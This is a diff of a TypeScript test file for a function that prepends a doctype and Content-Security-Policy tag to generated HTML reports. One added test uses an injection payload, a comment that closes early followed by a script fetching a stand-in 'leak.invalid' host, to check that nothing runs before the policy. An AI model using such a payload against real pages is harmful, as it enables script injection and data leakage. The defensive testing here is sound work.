@@ -9,7 +9,7 @@ import {
 } from './report-document.ts';
 import type { DayMetrics } from './schemas/day-metrics.ts';
 
-const policy = `<meta http-equiv="Content-Security-Policy" content="${reportContentSecurityPolicy}">`;
+const preamble = `<!doctype html><meta http-equiv="Content-Security-Policy" content="${reportContentSecurityPolicy}">`;
 
 describe('reportDocumentOf', () => {
   it('carries the contract policy exactly', () => {
@@ -18,30 +18,26 @@ describe('reportDocumentOf', () => {
     );
   });
 
-  it('puts the policy right after the doctype, so the page stays in standards mode', () => {
-    expect(
-      reportDocumentOf('<!doctype html><html lang="en"><head></head></html>'),
-    ).toBe(`<!doctype html>${policy}<html lang="en"><head></head></html>`);
+  it('puts a doctype and the policy in front of the whole report', () => {
+    for (const report of [
+      '<!doctype html><html lang="en"><head></head></html>',
+      '\n<!-- made by /wrap -->\n<!DOCTYPE html>\n<p>',
+      '<p>A fragment</p>',
+    ]) {
+      expect(reportDocumentOf(report)).toBe(`${preamble}${report}`);
+    }
   });
 
-  it('finds the doctype in any case and after leading comments', () => {
-    expect(
-      reportDocumentOf('\n<!-- made by /wrap -->\n<!DOCTYPE html>\n<p>'),
-    ).toBe(`\n<!-- made by /wrap -->\n<!DOCTYPE html>${policy}\n<p>`);
-  });
-
-  it('puts the policy first when there is no doctype', () => {
-    expect(reportDocumentOf('<p>A fragment</p>')).toBe(
-      `${policy}<p>A fragment</p>`,
-    );
+  it('keeps none of the report ahead of the policy, even a comment that ends early', () => {
+    const report =
+      '<!--><script>fetch("https://leak.invalid/before-policy",{mode:"no-cors"})</script><!-- --> <!doctype html>';
+    expect(reportDocumentOf(report)).toBe(`${preamble}${report}`);
   });
 
   it('keeps a policy the report sets itself, since both are enforced', () => {
     const own =
       '<!doctype html><head><meta http-equiv="Content-Security-Policy" content="default-src \'none\'"></head>';
-    const document = reportDocumentOf(own);
-    expect(document.startsWith(`<!doctype html>${policy}`)).toBe(true);
-    expect(document.endsWith(own.slice('<!doctype html>'.length))).toBe(true);
+    expect(reportDocumentOf(own)).toBe(`${preamble}${own}`);
   });
 });
 
